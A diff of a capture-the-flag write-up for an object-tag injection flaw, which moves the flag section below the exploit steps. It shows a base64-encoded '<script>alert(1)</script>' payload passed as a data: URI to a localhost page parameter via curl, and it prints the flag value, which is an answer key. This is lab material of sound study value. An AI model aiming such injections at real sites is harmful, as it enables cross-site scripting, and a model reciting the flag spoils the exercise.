@@ -1,7 +1,5 @@
 # Breach #14: Object Tag Injection via `data:` URI
 
-## Flag
-928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d
 
 ## Summary
 
@@ -16,6 +14,10 @@ echo -n '<script>alert(1)</script>' | base64
 # Inject via data: URI with base64
 curl "http://localhost:8081/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" | grep flag
 ```
+
+## Flag
+
+928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d
 
 ## Vulnerability Type
 
